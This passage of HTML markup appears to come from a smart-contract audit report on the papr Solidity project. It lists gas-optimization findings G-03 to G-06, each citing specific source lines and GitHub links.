class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxPrice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sendTo</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">           </span><span class=\"mtk12\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:          </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">532</span><span class=\"mtk1\">       </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleExcess</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">neededToSaveVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">533</span><span class=\"mtk1\">           </span><span class=\"mtk12\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">534</span><span class=\"mtk1\">:          </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">remaining</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L424-L428\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L424-L428</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapOracleFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_multiplier</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mark_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cachedTarget</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L156\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L156</a></p>\n<h2 id=\"g03--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" style=\"position:relative;\"><a href=\"#g03--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" aria-label=\"g03  add unchecked  for subtractions where the operands cannot underflow because of a previous require or if statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑03]  Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</h2>\n<p><code>require(a &#x3C;= b); x = b - a</code> => <code>require(a &#x3C;= b); unchecked { x = b - a }</code></p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit if-condition on line 542</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">546</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">papr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalOwed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L546\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L546</a></p>\n<h2 id=\"g04--keccak256-should-only-need-to-be-called-on-a-specific-string-literal-once\" style=\"position:relative;\"><a href=\"#g04--keccak256-should-only-need-to-be-called-on-a-specific-string-literal-once\" aria-label=\"g04  keccak256 should only need to be called on a specific string literal once permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑04]  <code>keccak256()</code> should only need to be called on a specific string literal once</h2>\n<p>It should be saved to an immutable variable, and the variable used instead. If the hash is being used as a part of a function selector, the cast to <code>bytes4</code> should also only be done once.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:                               </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Message(bytes32 id,bytes payload,uint256 timestamp)&quot;</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:                   </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ContractWideCollectionPrice(uint8 kind,uint256 twapSeconds,address contract)&quot;</span><span class=\"mtk1\">),</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L75\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L75</a></p>\n<h2 id=\"g05--optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g05--optimize-names-to-save-gas\" aria-label=\"g05  optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑05]  Optimize names to save gas</h2>\n<p><code>public</code>/<code>external</code> function names and <code>public</code> member variable names can be optimized to save gas. See <a href=\"https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9\">this</a> link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save <strong>128 gas</strong> each during deployment, and renaming functions to have lower method IDs will save <strong>22 gas</strong> per call, <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">per sorted position shifted</a>.</p>\n<p><em>There are 8 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit updateTarget(), lastUpdated(), target(), newTarget(), mark(), papr(), fundingPeriod()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">6</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IFundingRateController</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IFundingRateController.sol#L6\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IFundingRateController.sol#L6</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit addCollateral(), removeCollateral(), increaseDebt(), reduceDebt(), increaseDebtAndSell(), buyAndReduceDebt(), purchaseLiquidationAuctionNFT(), startLiquidationAuction(), setPool(), setFundingPeriod(), setLiquidationsLocked(), setAllowedCollateral(), sendPaprFromAuctionFees(), burnPaprFromAuctionFees(), collateralOwner(), isAllowed(), liquidationsLocked(), token0IsUnderlying(), maxLTV(), liquidationAuctionMinSpacing(), perPeriodAuctionDecayWAD(), auctionDecayPeriod(), auctionStartPriceMultiplier(), liquidationPenaltyBips(), maxDebt(), vaultInfo()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IPaprController</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IPaprController.sol#L9\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IPaprController.sol#L9</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IUniswapOracleFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit pool()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">6</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IUniswapOracleFundingRateController</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IFundingRateController</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IUniswapOracleFundingRateController.sol#L6\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IUniswapOracleFundingRateController.sol#L6</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">INFTEDA</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit auctionCurrentPrice(), auctionID(), auctionStartTime()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">INFTEDA</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/interfaces/INFTEDA.sol#L7\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/interfaces/INFTEDA.sol#L7</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit auctionCurrentPrice(), auctionID(), auctionStartTime()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">11</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">INFTEDA</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/NFTEDA.sol#L11\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/NFTEDA.sol#L11</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit uniswapV3SwapCallback()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L18\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L18</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit underwritePriceForCollateral()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L7\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L7</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapOracleFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit mark()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">UniswapOracleFundingRateController</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IUniswapOracleFundingRateController</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L15\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L15</a></p>\n<h2 id=\"g06--use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#g06--use-a-more-recent-version-of-solidity\" aria-label=\"g06  use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑06]  Use a more recent version of Solidity</h2>\n<p>Use a Solidity version of at least 0.8.2 to get simple compiler automatic inlining.</p>\n<p>Use a Solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads.</p>\n<p>Use a Solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than <code>revert()/require()</code> strings.</p>\n<p>Use a Solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.</p>\n<p><em>There are 10 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IFundingRateController.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IFundingRateController.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IPaprController.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IPaprController.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IUniswapOracleFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IUniswapOracleFundingRateController.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IUniswapOracleFundingRateController.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PoolAddress</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">4</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/PoolAddress.sol#L4\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/PoolAddress.sol#L4</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapHelpers</span><span class=\"mtk1\">.</span><span 